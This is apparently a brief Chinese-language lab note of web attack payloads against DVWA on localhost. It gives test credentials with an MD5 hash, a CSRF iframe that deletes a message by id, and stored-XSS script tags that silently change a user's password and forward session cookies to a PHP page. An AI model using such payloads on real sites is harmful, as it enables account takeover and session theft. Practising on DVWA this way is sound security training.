触发用户：
admin, hack，密码：123456
hash: e10adc3949ba59abbe56e057f20f883e


用CSRF触发删除某条留言（修改其中的id参数）：
<iframe src="http://localhost:83/dvwa/vulnerabilities/xss_s/?action=del&id=11">ddd</iframe>


偷偷修改密码为1234：
<script src="/dvwa/hackable/uploads/pwd_ajax.js"></script>

把客户端cookie转发给某个php：
<script src="/dvwa/hackable/uploads/get_cookie.js" />

<script src="/dvwa/hackable/uploads/get_cookie.gif" type="text/javascript"></script>
